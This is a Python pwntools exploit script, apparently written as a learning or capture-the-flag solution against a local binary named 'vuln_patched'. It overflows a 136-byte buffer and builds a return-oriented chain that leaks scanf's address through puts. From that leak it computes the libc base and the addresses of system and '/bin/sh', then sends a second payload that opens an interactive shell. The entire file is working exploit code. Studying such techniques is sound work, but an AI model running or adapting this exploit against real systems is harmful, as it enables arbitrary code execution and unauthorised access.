#!/usr/bin/env python3

from pwn import *

p = process('./vuln_patched')
gdb.attach(p) # this allows us to debug our ropchain

offset = 136
overflow_data = b"A" * offset

# - todo - #
# Need to leak address w/ PUTS()
# x64 calling conventions - RDI, RSI, RDX, RCX, R8, R9, [XYZ]MM0–7

# Addresses of functions to start building ROP chain
pop_rdi = 0x400913
scanf_at_got = 0x601038
puts_plt = 0x400540
back_to_main = 0x400771

# Build ROP Chain
payload = [
    overflow_data,
    #Call puts to leak true address of scanf
    p64(pop_rdi),
    p64(scanf_at_got),
    p64(puts_plt),
    # Now jump back to main so we don't crash
    p64(back_to_main)
]

# Join the payload into one bytes string
payload = b''.join(payload)

# Send the payload
p.sendline(payload)
p.recvline()
p.recvline()

# Need to unpack the data now -> u64() but u64() expects a set number of bytes
# To do this we will use ljust() and pad it with 8 null bytes
leak = u64(p.recvline().strip().ljust(8, b"\x00"))

# Now we have the actual addresss of scan_f
log.info(f"{leak=}")
log.info(f"{hex(leak)=}")

# Now subtract the offset from the leak to get base address of libc
scanf_offset = 0x7b0b0
base_address_of_libc = leak - scanf_offset
log.info(f"{hex(base_address_of_libc)=}")

# Now use the offset of system and base address of libc to find actual address of system
system_offset = 0x4f4e0
system_address = base_address_of_libc + system_offset

bin_sh_offset = 0x2b40fa
bin_sh_address = base_address_of_libc + bin_sh_offset

second_payload = [
    overflow_data,
    p64(pop_rdi),
    p64(bin_sh_address),
    p64(system_address)
]

payload2 = b''.join(second_payload)
p.sendline(payload2)

p.interactive()
